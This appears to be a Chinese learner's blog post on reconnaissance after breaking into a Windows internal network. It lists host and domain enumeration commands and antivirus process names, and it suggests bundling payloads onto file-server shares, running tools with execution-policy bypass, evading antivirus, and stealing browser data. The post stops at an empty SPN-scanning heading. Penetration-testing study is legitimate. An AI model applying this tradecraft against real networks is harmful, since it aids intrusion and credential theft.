<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>内网渗透学习-Windows信息搜集篇-持续更新 | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>内网渗透学习-Windows信息搜集篇-持续更新</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-09-03T07:55:47.059Z" id="date"> 2023-09-03</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-09-10T03:37:13.982Z" id="updated"> 2023-09-10</time></div></span><br><span>文章总字数: <div class="control">6.1k</div></span><br><span>预计阅读时间: <div class="control">26 分钟</div></span></div></div><hr><div id="post-content"><p>当我们通过渗透进入内网环境后，面对的是一片未知区域。需要对当前机器角色判断，对机器所处区域分析。</p>
<p>判断机器所处于网络拓扑哪个区域，是在<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/8580587c3201">DMZ区</a>、<code>办公区</code>、<code>核心区</code>。区域界限是相对的</p>
<h2 id="0x01-机器角色判断"><a href="#0x01-机器角色判断" class="headerlink" title="0x01-机器角色判断"></a>0x01 机器角色判断</h2>
<ul>
<li>文件服务器：配合社工，生成payload捆绑到文件服务器公用文件上，可批量上线主机</li>
<li>DNS服务器：端口53，可通过DNS服务器获取内网web系统信息，或者探测域信息</li>
<li>DHCP服务器：查看内网多组网段信息，更多的获取拓补信息</li>
<li>开发测试服务器：获取源码，新的信息资产，多存在弱口令</li>
<li>代理服务器：获取服务器账号，拿到各种密码</li>
<li>web服务器：可能需要提权(一般接触到的环境)</li>
<li>个人PC：查看是否存在域环境</li>
</ul>
<h2 id="0x02-本机信息收集"><a href="#0x02-本机信息收集" class="headerlink" title="0x02-本机信息收集"></a>0x02 本机信息收集</h2>
<p>包括操作系统、权限、内网IP段、杀软、端口、服务、补丁情况、网络连接、共享、会话等。如果是域内主机，那么操作系统、应用软件、补丁、服务、杀软一般都是批量安装的。文件共享/FTP连接记录、浏览器访问记录、mstsc连接记录、ssh连接记录。</p>
<ul>
<li>如果由于使用了x86的shell无法使用命令，需要在命令前加上<code>c:\windows\sysnative</code>，这样就能执行x64的命令了。</li>
</ul>
<h3 id="2-1-查看主机名"><a href="#2-1-查看主机名" class="headerlink" title="2-1-查看主机名"></a>2.1 查看主机名</h3>
<p><code>hostname</code></p>
<p class='item-img' data-src='image-20230904213133038.png'><img src="image-20230904213133038.png" alt="image-20230904213133038"></p>
<h3 id="2-2-查看版本"><a href="#2-2-查看版本" class="headerlink" title="2-2-查看版本"></a>2.2 查看版本</h3>
<p><code>ver</code></p>
<p class='item-img' data-src='image-20230904213228806.png'><img src="image-20230904213228806.png" alt="image-20230904213228806"></p>
<h3 id="2-3-查看所有环境变量"><a href="#2-3-查看所有环境变量" class="headerlink" title="2-3-查看所有环境变量"></a>2.3 查看所有环境变量</h3>
<p><code>set</code></p>
<p class='item-img' data-src='image-20230904214436820.png'><img src="image-20230904214436820.png" alt="image-20230904214436820"></p>
<h3 id="2-4-查看安装驱动"><a href="#2-4-查看安装驱动" class="headerlink" title="2-4-查看安装驱动"></a>2.4 查看安装驱动</h3>
<p><code>DRIVERQUERY</code></p>
<p class='item-img' data-src='image-20230904214716930.png'><img src="image-20230904214716930.png" alt="image-20230904214716930"></p>
<h3 id="2-5-查看操作系统信息"><a href="#2-5-查看操作系统信息" class="headerlink" title="2-5-查看操作系统信息"></a>2.5 查看操作系统信息</h3>
<h4 id="2-5-1-架构"><a href="#2-5-1-架构" class="headerlink" title="2-5-1-架构"></a>2.5.1 架构</h4>
<p><code>wmic os get osarchitecture</code></p>
<p class='item-img' data-src='image-20230904214754849.png'><img src="image-20230904214754849.png" alt="image-20230904214754849"></p>
<h4 id="2-5-2-系统名"><a href="#2-5-2-系统名" class="headerlink" title="2-5-2-系统名"></a>2.5.2 系统名</h4>
<p><code>wmic os get caption</code></p>
<p class='item-img' data-src='image-20230904214801657.png'><img src="image-20230904214801657.png" alt="image-20230904214801657"></p>
<h3 id="2-6-查看逻辑盘"><a href="#2-6-查看逻辑盘" class="headerlink" title="2-6-查看逻辑盘"></a>2.6 查看逻辑盘</h3>
<p><code>wmic logicaldisk get caption</code></p>
<p class='item-img' data-src='image-20230904214847677.png'><img src="image-20230904214847677.png" alt="image-20230904214847677"></p>
<h3 id="2-7-本机网络配置"><a href="#2-7-本机网络配置" class="headerlink" title="2-7-本机网络配置"></a>2.7 本机网络配置</h3>
<p><code>ipconfig /all - ip地址信息</code></p>
<p class='item-img' data-src='image-20230904184627149.png'><img src="image-20230904184627149.png" alt="image-20230904184627149"></p>
<p><code>netstat -ano - 端口信息</code></p>
<p class='item-img' data-src='image-20230904184725197.png'><img src="image-20230904184725197.png" alt="image-20230904184725197"></p>
<p><code>arp -a - arp记录信息</code></p>
<p class='item-img' data-src='image-20230904184855347.png'><img src="image-20230904184855347.png" alt="image-20230904184855347"></p>
<h3 id="2-8-查看当前系统版本"><a href="#2-8-查看当前系统版本" class="headerlink" title="2-8-查看当前系统版本"></a>2.8 查看当前系统版本</h3>
<h4 id="tip：wmic命令"><a href="#tip：wmic命令" class="headerlink" title="tip：wmic命令"></a>tip：wmic命令</h4>
<p>顺便了解一下wmic命令作用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">WMIC（Windows Management Instrumentation Command-line）是Windows操作系统中的一个命令行实用程序，用于执行各种系统管理任务和查询系统信息。通过WMIC，用户可以在命令行中执行各种WMI（Windows Management Instrumentation）操作，包括查询系统信息、管理进程、服务、网络设置等。 WMIC提供了丰富的命令<br></code></pre></td></tr></table></figure>
<p><code>wmic OS get Caption,CSDVersion,OSArchitecture,Version</code></p>
<p class='item-img' data-src='image-20230904185053443.png'><img src="image-20230904185053443.png" alt="image-20230904185053443"></p>
<h3 id="2-9-查看体系结构"><a href="#2-9-查看体系结构" class="headerlink" title="2-9-查看体系结构"></a>2.9 查看体系结构</h3>
<p><code>echo %PROCESSOR_ARCHITECTURE%</code></p>
<p class='item-img' data-src='image-20230904185257979.png'><img src="image-20230904185257979.png" alt="image-20230904185257979"></p>
<h3 id="2-10-查询操作系统及软件信息"><a href="#2-10-查询操作系统及软件信息" class="headerlink" title="2-10-查询操作系统及软件信息"></a>2.10 查询操作系统及软件信息</h3>
<p><code>systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; ## 英文系统</code><br>
<code>systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot; ## 中文系统</code></p>
<p class='item-img' data-src='image-20230904185818019.png'><img src="image-20230904185818019.png" alt="image-20230904185818019"></p>
<p>这里不知为何打不开，找了几篇文章，感觉是环境变量的问题，设置了之后又发现语法错误，双引号是中文版的。。。，好在最后成功了，且为中文系统</p>
<p class='item-img' data-src='image-20230904191114509.png'><img src="image-20230904191114509.png" alt="image-20230904191114509"></p>
<h3 id="2-11-查看-net-framework版本"><a href="#2-11-查看-net-framework版本" class="headerlink" title="2-11-查看-net-framework版本"></a>2.11 <a target="_blank" rel="noopener" href="http://xn--jvv205a.net">查看.net</a> framework版本</h3>
<p><code>reg query &quot;HKLM\Software\Microsoft\NET Framework Setup\NDP&quot; /s /v version | findstr /i version | sort /+26 /r</code></p>
<p class='item-img' data-src='image-20230904191245270.png'><img src="image-20230904191245270.png" alt="image-20230904191245270"></p>
<h3 id="2-12-查看补丁列表"><a href="#2-12-查看补丁列表" class="headerlink" title="2-12-查看补丁列表"></a>2.12 查看补丁列表</h3>
<p><code>systeminfo</code></p>
<p class='item-img' data-src='image-20230904191328746.png'><img src="image-20230904191328746.png" alt="image-20230904191328746"></p>
<h3 id="2-13-查看补丁的名称、描述、ID、安装时间等"><a href="#2-13-查看补丁的名称、描述、ID、安装时间等" class="headerlink" title="2-13-查看补丁的名称、描述、ID、安装时间等"></a>2.13 查看补丁的名称、描述、ID、安装时间等</h3>
<p><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></p>
<p class='item-img' data-src='image-20230904191657172.png'><img src="image-20230904191657172.png" alt="image-20230904191657172"></p>
<h3 id="2-14-PowerShell收集软件的版本信息"><a href="#2-14-PowerShell收集软件的版本信息" class="headerlink" title="2-14-PowerShell收集软件的版本信息"></a>2.14 PowerShell收集软件的版本信息</h3>
<p><code>powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name, version&quot;</code></p>
<p class='item-img' data-src='image-20230904191734197.png'><img src="image-20230904191734197.png" alt="image-20230904191734197"></p>
<h3 id="2-15-查看安装的软件的版本、路径等"><a href="#2-15-查看安装的软件的版本、路径等" class="headerlink" title="2-15-查看安装的软件的版本、路径等"></a>2.15 查看安装的软件的版本、路径等</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">wmic product get name, version<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230904192209137.png'><img src="image-20230904192209137.png" alt="image-20230904192209137"></p>
<p>查看软件比较靠谱的做法是远程加载本地ps文件，cs中可以使用powershell-import,上传ListInstallProgram.ps1后输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">powershell Get-list<br></code></pre></td></tr></table></figure>
<p>将文件放到靶机，本地加载也可以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">shell powershell -exec bypass -Command &quot;&amp; &#123;Import-Module &#x27;C:\Users\HackerQWQ\Desktop\ListInstalledProgram.ps1&#x27;;Get-list&#125;&quot;<br></code></pre></td></tr></table></figure>
<p>这里尝试了半天，不知道从哪下手，还是对cs不熟悉，之后深入学习慢慢搞</p>
<h3 id="2-16-查看当前用户权限"><a href="#2-16-查看当前用户权限" class="headerlink" title="2-16-查看当前用户权限"></a>2.16 查看当前用户权限</h3>
<p><code>whoami &amp;&amp; whoami /priv</code></p>
<p class='item-img' data-src='image-20230904210854189.png'><img src="image-20230904210854189.png" alt="image-20230904210854189"></p>
<h3 id="2-17-查询本机服务信息"><a href="#2-17-查询本机服务信息" class="headerlink" title="2-17-查询本机服务信息"></a>2.17 查询本机服务信息</h3>
<p><code>wmic service list brief</code></p>
<p class='item-img' data-src='image-20230904210935433.png'><img src="image-20230904210935433.png" alt="image-20230904210935433"></p>
<h3 id="2-18-查看开启的服务"><a href="#2-18-查看开启的服务" class="headerlink" title="2-18-查看开启的服务"></a>2.18 查看开启的服务</h3>
<p><code>net start</code></p>
<p class='item-img' data-src='image-20230904210950915.png'><img src="image-20230904210950915.png" alt="image-20230904210950915"></p>
<h3 id="2-19-wmic查询进程信息"><a href="#2-19-wmic查询进程信息" class="headerlink" title="2-19-wmic查询进程信息"></a>2.19 wmic查询进程信息</h3>
<p><code>wmic process list brief</code></p>
<p class='item-img' data-src='image-20230904211011968.png'><img src="image-20230904211011968.png" alt="image-20230904211011968"></p>
<h3 id="2-20-查看进程"><a href="#2-20-查看进程" class="headerlink" title="2-20-查看进程"></a>2.20 查看进程</h3>
<p><code>tasklist /svc</code></p>
<p class='item-img' data-src='image-20230904211034249.png'><img src="image-20230904211034249.png" alt="image-20230904211034249"></p>
<h3 id="2-21-查看启动程序信息"><a href="#2-21-查看启动程序信息" class="headerlink" title="2-21-查看启动程序信息"></a>2.21 查看启动程序信息</h3>
<p><code>wmic startup get command,caption</code></p>
<p class='item-img' data-src='image-20230904211052427.png'><img src="image-20230904211052427.png" alt="image-20230904211052427"></p>
<h3 id="2-22-查看计划任务-需要高权限"><a href="#2-22-查看计划任务-需要高权限" class="headerlink" title="2-22-查看计划任务-需要高权限"></a>2.22 查看计划任务(需要高权限)</h3>
<p><code>at（win10之前）</code><br>
<code>chtasks /query /fo LIST /v（win10之后）</code></p>
<p class='item-img' data-src='image-20230904211208228.png'><img src="image-20230904211208228.png" alt="image-20230904211208228"></p>
<h3 id="2-23-查看主机开机时间"><a href="#2-23-查看主机开机时间" class="headerlink" title="2-23-查看主机开机时间"></a>2.23 查看主机开机时间</h3>
<p><code>net statistics workstation</code></p>
<p class='item-img' data-src='image-20230904211242395.png'><img src="image-20230904211242395.png" alt="image-20230904211242395"></p>
<h3 id="2-24-查看本机用户列表"><a href="#2-24-查看本机用户列表" class="headerlink" title="2-24-查看本机用户列表"></a>2.24 查看本机用户列表</h3>
<p><code>net user</code></p>
<p class='item-img' data-src='image-20230904211256931.png'><img src="image-20230904211256931.png" alt="image-20230904211256931"></p>
<h3 id="2-25-获取本地管理员信息"><a href="#2-25-获取本地管理员信息" class="headerlink" title="2-25-获取本地管理员信息"></a>2.25 获取本地管理员信息</h3>
<p><code>net localgroup administrators</code></p>
<p class='item-img' data-src='image-20230904211358193.png'><img src="image-20230904211358193.png" alt="image-20230904211358193"></p>
<h3 id="2-26-查看当前在线用户"><a href="#2-26-查看当前在线用户" class="headerlink" title="2-26-查看当前在线用户"></a>2.26 查看当前在线用户</h3>
<p><code>query user || qwinsta</code></p>
<p class='item-img' data-src='image-20230904211418778.png'><img src="image-20230904211418778.png" alt="image-20230904211418778"></p>
<h3 id="2-27-查看在线用户"><a href="#2-27-查看在线用户" class="headerlink" title="2-27-查看在线用户"></a>2.27 查看在线用户</h3>
<p><code>quser</code></p>
<p class='item-img' data-src='image-20230904211427997.png'><img src="image-20230904211427997.png" alt="image-20230904211427997"></p>
<h3 id="2-28-列出断开本地计算机与所连接的客户端的对话-需要高权限"><a href="#2-28-列出断开本地计算机与所连接的客户端的对话-需要高权限" class="headerlink" title="2-28-列出断开本地计算机与所连接的客户端的对话-需要高权限"></a>2.28 列出断开本地计算机与所连接的客户端的对话(需要高权限)</h3>
<p><code>net session</code></p>
<p class='item-img' data-src='image-20230904211530179.png'><img src="image-20230904211530179.png" alt="image-20230904211530179"></p>
<h3 id="2-29-查询端口列表"><a href="#2-29-查询端口列表" class="headerlink" title="2-29-查询端口列表"></a>2.29 查询端口列表</h3>
<p><code>Windows: netstat -ano</code><br>
<code>linux: netstat -tnlp</code></p>
<p class='item-img' data-src='image-20230904211553775.png'><img src="image-20230904211553775.png" alt="image-20230904211553775"></p>
<p class='item-img' data-src='image-20230904211619090.png'><img src="image-20230904211619090.png" alt="image-20230904211619090"></p>
<h3 id="2-30-查看本机共享列表和可访问的域共享列表"><a href="#2-30-查看本机共享列表和可访问的域共享列表" class="headerlink" title="2-30-查看本机共享列表和可访问的域共享列表"></a>2.30 查看本机共享列表和可访问的域共享列表</h3>
<p><code>net share （445端口）</code></p>
<p class='item-img' data-src='image-20230904211638834.png'><img src="image-20230904211638834.png" alt="image-20230904211638834"></p>
<h3 id="2-31-查找共享列表"><a href="#2-31-查找共享列表" class="headerlink" title="2-31-查找共享列表"></a>2.31 查找共享列表</h3>
<p><code>wmic share get name,path,status</code></p>
<p class='item-img' data-src='image-20230904211654136.png'><img src="image-20230904211654136.png" alt="image-20230904211654136"></p>
<h3 id="2-32-磁盘映射"><a href="#2-32-磁盘映射" class="headerlink" title="2-32-磁盘映射"></a>2.32 磁盘映射</h3>
<p><code>net use k: \192.168.1.10\c$</code></p>
<p>这里不太懂，没搞出来</p>
<h3 id="2-33-查询路由表"><a href="#2-33-查询路由表" class="headerlink" title="2-33-查询路由表"></a>2.33 查询路由表</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">route print<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230904212407238.png'><img src="image-20230904212407238.png" alt="image-20230904212407238"></p>
<p>可用接口的ARP缓存表。局域网内arp -a，查看是否有重复的mac地址，判断是否存在arp欺骗。服务器绑定mac地址方式防止arp欺骗</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">arp -a<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230904212555006.png'><img src="image-20230904212555006.png" alt="image-20230904212555006"></p>
<h3 id="2-34-查看远程连接信息"><a href="#2-34-查看远程连接信息" class="headerlink" title="2-34-查看远程连接信息"></a>2.34 查看远程连接信息</h3>
<p><code>cmdkey /l</code></p>
<p class='item-img' data-src='image-20230904212709052.png'><img src="image-20230904212709052.png" alt="image-20230904212709052"></p>
<h3 id="2-35-查看杀软"><a href="#2-35-查看杀软" class="headerlink" title="2-35-查看杀软"></a>2.35 查看杀软</h3>
<p><code>WMIC /Node:localhost /Namespace:\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</code></p>
<p>暂时没有</p>
<h3 id="2-36-查看本地密码策略"><a href="#2-36-查看本地密码策略" class="headerlink" title="2-36-查看本地密码策略"></a>2.36 查看本地密码策略</h3>
<p><code>net accounts</code></p>
<p class='item-img' data-src='image-20230904214925560.png'><img src="image-20230904214925560.png" alt="image-20230904214925560"></p>
<h3 id="2-37-查看hosts文件："><a href="#2-37-查看hosts文件：" class="headerlink" title="2-37-查看hosts文件："></a>2.37 查看hosts文件：</h3>
<p><code>linux:cat /etc/hosts</code><br>
<code>windows:type c:\Windows\system32\drivers\etc\hosts</code></p>
<p class='item-img' data-src='image-20230904214950300.png'><img src="image-20230904214950300.png" alt="image-20230904214950300"></p>
<h3 id="2-38-查看dns缓存"><a href="#2-38-查看dns缓存" class="headerlink" title="2-38-查看dns缓存"></a>2.38 查看dns缓存</h3>
<p><code>ipconfig /displaydns</code></p>
<ul>
<li>
<p>列举安装的软件</p>
<p>ListInstalledProgram项目地址:<a target="_blank" rel="noopener" href="https://github.com/3gstudent/ListInstalledPrograms">https://github.com/3gstudent/ListInstalledPrograms</a></p>
</li>
<li>
<p>自动信息收集</p>
<p>我们可使用自动化脚本WMIC（Windows Management Instrumentation Command-Line，Windows管理工具命令行）。在默认情况下，任何版本的Windows XP的低权限用户不能访问WMIC，<strong>Windows 7</strong>以上版本的低权限用户允许访问<strong>WMIC</strong>并执行相关操作。 执行后，会将信息收集的结果写入HTML文档。</p>
<p>项目地址：<a target="_blank" rel="noopener" href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar">http://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p>
</li>
</ul>
<p class='item-img' data-src='image-20230904215134630.png'><img src="image-20230904215134630.png" alt="image-20230904215134630"></p>
<p>获取主机信息也可以用Seatbelt.exe，项目地址：<a target="_blank" rel="noopener" href="https://github.com/GhostPack/Seatbelt/tree/master%EF%BC%8C%E9%9C%80%E8%A6%81%E7%BC%96%E8%AF%91%EF%BC%8C%E6%94%BE%E5%88%B0%E9%9D%B6%E6%9C%BA%E4%B8%8A%E6%89%A7%E8%A1%8C%E4%B8%8B%E5%88%97%E5%91%BD%E4%BB%A4">https://github.com/GhostPack/Seatbelt/tree/master，需要编译，放到靶机上执行下列命令</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">shell Seatbelt.exe -group=all &gt; env.txt<br></code></pre></td></tr></table></figure>
<p>最好先<code>免杀一下</code>，不然360会一直警告,cs上的插件也有集成Seatbelt，可以直接使用插件   --这里等学了免杀在搞吧</p>
<p class='item-img' data-src='image-20230904215159103.png'><img src="image-20230904215159103.png" alt="image-20230904215159103"></p>
<h3 id="2-39-常见查毒软件进程"><a href="#2-39-常见查毒软件进程" class="headerlink" title="2-39-常见查毒软件进程"></a>2.39 常见查毒软件进程</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">tasklist /svc<br></code></pre></td></tr></table></figure>
<p>随后将结果放到avList中对比查看</p>
<table>
<thead>
<tr>
<th>进程</th>
<th>软件名称</th>
</tr>
</thead>
<tbody>
<tr>
<td>360SD.EXE</td>
<td>360杀毒</td>
</tr>
<tr>
<td>360TRAY.EXE</td>
<td>360实时保护</td>
</tr>
<tr>
<td>ZHUDONGFANGYU.EXE</td>
<td>360主动防御</td>
</tr>
<tr>
<td>KSAFETRAY.EXE</td>
<td>金山卫士</td>
</tr>
<tr>
<td>SAFEDOGUPDATECENTER.EXE</td>
<td>服务器安全狗</td>
</tr>
<tr>
<td>MCAFEE MCSHIELD.EXE</td>
<td>迈克菲杀毒软件</td>
</tr>
<tr>
<td>EGUI.EXE</td>
<td>NOD32</td>
</tr>
<tr>
<td>AVP.EXE</td>
<td>卡巴斯基</td>
</tr>
<tr>
<td>AVGUARD.EXE</td>
<td>小红伞</td>
</tr>
<tr>
<td>BDAGENT.EXE</td>
<td>BITDEFENDER</td>
</tr>
</tbody>
</table>
<p>可以用avList自动判断,项目地址:<a target="_blank" rel="noopener" href="https://github.com/gh0stkey/avList">https://github.com/gh0stkey/avList</a></p>
<p class='item-img' data-src='image-20230905164342620.png'><img src="image-20230905164342620.png" alt="image-20230905164342620"></p>
<h3 id="2-40-浏览器信息收集"><a href="#2-40-浏览器信息收集" class="headerlink" title="2-40-浏览器信息收集"></a>2.40 浏览器信息收集</h3>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a></p>
<p class='item-img' data-src='image-20230905164434895.png'><img src="image-20230905164434895.png" alt="image-20230905164434895"></p>
<h2 id="0x03-域环境信息收集"><a href="#0x03-域环境信息收集" class="headerlink" title="0x03-域环境信息收集"></a>0x03 域环境信息收集</h2>
<h3 id="3-1-判断是否存在域"><a href="#3-1-判断是否存在域" class="headerlink" title="3-1-判断是否存在域"></a>3.1 判断是否存在域</h3>
<p><code>ipconfig /all</code> 可查看网关IP地址、DNS的IP地址、域名、本机是否和DNS服务器处在同一网段等。</p>
<p class='item-img' data-src='image-20230907203316781.png'><img src="image-20230907203316781.png" alt="image-20230907203316781"></p>
<h3 id="3-2-解析域名ip"><a href="#3-2-解析域名ip" class="headerlink" title="3-2-解析域名ip"></a>3.2 解析域名ip</h3>
<p>通过反向解析查询命令<code>nslookup</code>来解析域名的IP地址，用解析到的IP地址进行对比，判断域控服务器和DNS服务器是否在同一台机器上</p>
<p><code>nslookup hacker.testlab(这里写自己的域控制服务器域名)</code></p>
<p class='item-img' data-src='image-20230907203351564.png'><img src="image-20230907203351564.png" alt="image-20230907203351564"></p>
<h3 id="3-3-查看当前权限"><a href="#3-3-查看当前权限" class="headerlink" title="3-3-查看当前权限"></a>3.3 查看当前权限</h3>
<p><code>whoami</code></p>
<p class='item-img' data-src='image-20230907203359645.png'><img src="image-20230907203359645.png" alt="image-20230907203359645"></p>
<h3 id="3-4-获取域SID"><a href="#3-4-获取域SID" class="headerlink" title="3-4-获取域SID"></a>3.4 获取域SID</h3>
<p><code>whoami /all</code></p>
<p class='item-img' data-src='image-20230905165730621.png'><img src="image-20230905165730621.png" alt="image-20230905165730621"></p>
<h3 id="3-5-查询指定用户的详情信息"><a href="#3-5-查询指定用户的详情信息" class="headerlink" title="3-5-查询指定用户的详情信息"></a>3.5 查询指定用户的详情信息</h3>
<p><code>net user xxx /domain</code></p>
<p class='item-img' data-src='image-20230909144644670.png'><img src="image-20230909144644670.png" alt="image-20230909144644670"></p>
<h3 id="3-6-查看域内所有账号"><a href="#3-6-查看域内所有账号" class="headerlink" title="3-6-查看域内所有账号"></a>3.6 查看域内所有账号</h3>
<p><code>net user /domain</code></p>
<p class='item-img' data-src='image-20230909144558243.png'><img src="image-20230909144558243.png" alt="image-20230909144558243"></p>
<h3 id="3-7-对比查看”域-域名-”和”登录服务器-域控制器-”的信息是否匹配"><a href="#3-7-对比查看”域-域名-”和”登录服务器-域控制器-”的信息是否匹配" class="headerlink" title="3-7-对比查看”域-域名-”和”登录服务器-域控制器-”的信息是否匹配"></a>3.7 对比查看”域(域名)”和”登录服务器(域控制器)”的信息是否匹配</h3>
<p><code>systeminfo</code></p>
<p><strong>域名</strong></p>
<p class='item-img' data-src='image-20230909145055338.png'><img src="image-20230909145055338.png" alt="image-20230909145055338"></p>
<p><strong>域控制器</strong></p>
<p class='item-img' data-src='image-20230909145142138.png'><img src="image-20230909145142138.png" alt="image-20230909145142138"></p>
<h3 id="3-8-对比查看”工作站域DNS名称-域名-”和”登录域-域控制器-”的信息是否相匹配"><a href="#3-8-对比查看”工作站域DNS名称-域名-”和”登录域-域控制器-”的信息是否相匹配" class="headerlink" title="3-8-对比查看”工作站域DNS名称-域名-”和”登录域-域控制器-”的信息是否相匹配"></a>3.8 对比查看”工作站域DNS名称(域名)”和”登录域(域控制器)”的信息是否相匹配</h3>
<p><code>net config workstation	</code></p>
<p class='item-img' data-src='image-20230909145319693.png'><img src="image-20230909145319693.png" alt="image-20230909145319693"></p>
<h3 id="3-9-查看时间可以找到域控"><a href="#3-9-查看时间可以找到域控" class="headerlink" title="3-9-查看时间可以找到域控"></a>3.9 查看时间可以找到域控</h3>
<p><code>net time /domain</code></p>
<p class='item-img' data-src='image-20230909145333162.png'><img src="image-20230909145333162.png" alt="image-20230909145333162"></p>
<h3 id="3-10-查看域密码策略"><a href="#3-10-查看域密码策略" class="headerlink" title="3-10-查看域密码策略"></a>3.10 查看域密码策略</h3>
<p><code>net accounts /domain</code></p>
<p class='item-img' data-src='image-20230909150815650.png'><img src="image-20230909150815650.png" alt="image-20230909150815650"></p>
<h3 id="3-11-查看当前登录域"><a href="#3-11-查看当前登录域" class="headerlink" title="3-11-查看当前登录域"></a>3.11 查看当前登录域</h3>
<p><code>net config workstation</code></p>
<p class='item-img' data-src='image-20230909150852060.png'><img src="image-20230909150852060.png" alt="image-20230909150852060"></p>
<h3 id="3-12-登录本机的域管理员"><a href="#3-12-登录本机的域管理员" class="headerlink" title="3-12-登录本机的域管理员"></a>3.12 登录本机的域管理员</h3>
<p><code>net localgroup administrators /domain</code></p>
<p class='item-img' data-src='image-20230909150937358.png'><img src="image-20230909150937358.png" alt="image-20230909150937358"></p>
<h3 id="3-13-获取域控ip"><a href="#3-13-获取域控ip" class="headerlink" title="3-13-获取域控ip"></a>3.13 获取域控ip</h3>
<p><code>ping -a xxx.com</code></p>
<p class='item-img' data-src='image-20230909151005372.png'><img src="image-20230909151005372.png" alt="image-20230909151005372"></p>
<h3 id="3-14-查询域"><a href="#3-14-查询域" class="headerlink" title="3-14-查询域"></a>3.14 查询域</h3>
<p><code>net view /domain</code></p>
<p class='item-img' data-src='image-20230909151021573.png'><img src="image-20230909151021573.png" alt="image-20230909151021573"></p>
<h3 id="3-15-查询域内的所有计算机"><a href="#3-15-查询域内的所有计算机" class="headerlink" title="3-15-查询域内的所有计算机"></a>3.15 查询域内的所有计算机</h3>
<p><code>net view /domain:HACKER</code></p>
<p class='item-img' data-src='image-20230909153213712.png'><img src="image-20230909153213712.png" alt="image-20230909153213712"></p>
<h3 id="3-16-查询域的所有组（enterprise-admins组权限最大）"><a href="#3-16-查询域的所有组（enterprise-admins组权限最大）" class="headerlink" title="3-16-查询域的所有组（enterprise-admins组权限最大）"></a>3.16 查询域的所有组（enterprise admins组权限最大）</h3>
<p><code>net group /domain</code></p>
<p class='item-img' data-src='image-20230909153243216.png'><img src="image-20230909153243216.png" alt="image-20230909153243216"></p>
<h3 id="3-17-SPN扫描"><a href="#3-17-SPN扫描" class="headerlink" title="3-17-SPN扫描"></a>3.17 SPN扫描</h3>
